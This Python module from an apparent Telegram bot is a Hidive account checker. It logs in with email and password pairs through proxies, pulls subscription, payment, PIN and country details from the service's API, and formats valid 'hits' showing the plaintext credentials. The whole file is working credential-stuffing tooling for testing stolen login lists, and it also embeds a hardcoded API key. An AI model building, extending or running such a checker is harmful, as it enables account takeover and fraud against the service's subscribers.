"""
bot/modules/hidive.py
~~~~~~~~~~~~~~~~~~~~~
Hidive account checker using ``requests`` – exact logic from ``Hd.py``.

Each check runs in its own ``requests.Session`` (isolated cookies/state)
and is dispatched via ``asyncio.to_thread()`` so the event loop stays free.
"""

from __future__ import annotations

import asyncio
from typing import Optional

import requests

from bot.utils.logger import setup_logger

log = setup_logger("mod.hidive")

# ── API constants (from Hd.py) ──────────────────────────────────────────
_API_KEY = "857a1e5d-e35e-4fdf-805b-a87b6f8364bf"
_APP_VAR = "6.57.10.b20743c"


# ── Synchronous check (mirrors Hd.py exactly) ──────────────────────────

def _check_sync(
    email: str,
    password: str,
    proxy: Optional[dict[str, str]] = None,
) -> Optional[dict]:
    """Check a single Hidive account using ``requests.Session``.

    Returns a dict with hit details, a dict with ``free=True`` for free
    accounts, or ``None`` for bad credentials / errors.
    """
    session = requests.Session()
    headers = {
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "Realm": "dce.hidive",
        "x-api-key": _API_KEY,
        "x-app-var": _APP_VAR,
        "app": "dice",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    }

    try:
        # 1. LOGIN
        login_payload = {"id": email, "secret": password}
        r1 = session.post(
            "https://dce-frontoffice.imggaming.com/api/v2/login",
            json=login_payload, headers=headers, proxies=proxy, timeout=15,
        )

        if "authorisationToken" not in r1.text:
            return None

        token = r1.json()["authorisationToken"]
        headers["Authorization"] = f"Bearer {token}"

        # 2. SUBSCRIPTION CHECK
        r2 = session.get(
            "https://dce-frontoffice.imggaming.com/api/v2/licence-family"
            "?includeEntitlements=ALL_ACTIVE_USER_ENTITLEMENTS",
            headers=headers, proxies=proxy, timeout=10,
        )

        if 'status":"ACTIVE' in r2.text:
            data = r2.json()
            family = data.get("licenceFamilies", [{}])[0]
            ent = family.get("entitlements", [{}])[0]

            v_type = ent.get("type", "STANDARD")
            v_name = ent.get("name", "MONTHLY")
            auto_renew = family.get("autoRenewingStatus") == "AUTO_RENEWING"

            raw_pay = family.get("paymentProviderInfo", {}).get("type", "STRIPE")
            if raw_pay == "APPLE_IAP":
                pay_method = "App Store"
            elif raw_pay == "GOOGLE_IAP":
                pay_method = "Play Store"
            else:
                pay_method = "STRIPE"

            # 3. PROFILE & COUNTRY
            r_prof = session.get(
                "https://dce-frontoffice.imggaming.com/api/v1/profile",
                headers=headers, proxies=proxy, timeout=10,
            ).json()
            pin_protected = r_prof.get("pinProtection") == "PROTECTED"

            r_addr = session.get(
                "https://dce-frontoffice.imggaming.com/api/v2/user/address",
                headers=headers, proxies=proxy, timeout=10,
            ).json()
            cc = r_addr.get("countryCode", "US")
            country = "United States 🇺🇸" if cc == "US" else cc

            return {
                "email": email,
                "password": password,
                "type": v_type,
                "name": v_name,
                "renewing": auto_renew,
                "payment": pay_method,
                "pin_protected": pin_protected,
                "country": country,
            }
        else:
            # Valid login but no active subscription → free account.
            return {"email": email, "password": password, "free": True}

    except Exception as exc:
        log.debug("HD check failed for %s: %s", email, exc)
        return None


# ── Async wrapper ───────────────────────────────────────────────────────

async def check_account(
    email: str,
    password: str,
    proxy: Optional[dict[str, str]] = None,
) -> Optional[dict]:
    """Async wrapper — runs the synchronous check in a thread."""
    return await asyncio.to_thread(_check_sync, email, password, proxy)


# ── Formatting helpers ──────────────────────────────────────────────────

def format_hit(hit: dict) -> str:
    """Format a hit dictionary into a user-friendly Telegram string."""
    renew = "YES ✅" if hit["renewing"] else "NO ❌"
    pin = "YES ✅" if hit["pin_protected"] else "NO ❌"
    return (
        f"📺 **Hidive Hit**\n"
        f"┣ **Email:** `{hit['email']}`\n"
        f"┣ **Password:** `{hit['password']}`\n"
        f"┣ **Plan:** 〖{hit['type']}〗-[{hit['name']}]\n"
        f"┣ **Payment:** {hit['payment']}\n"
        f"┣ **Renewing:** {renew}\n"
        f"┣ **PIN Protected:** {pin}\n"
        f"┗ **Country:** {hit['country']}"
    )


def format_hit_line(hit: dict) -> str:
    """One-line format for results file."""
    renew = "YES" if hit["renewing"] else "NO"
    pin = "YES" if hit["pin_protected"] else "NO"
    return (
        f"{hit['email']}:{hit['password']} | "
        f"Plan={hit['type']}-{hit['name']} | Pay={hit['payment']} | "
        f"Renew={renew} | PIN={pin} | Country={hit['country']}"
    )
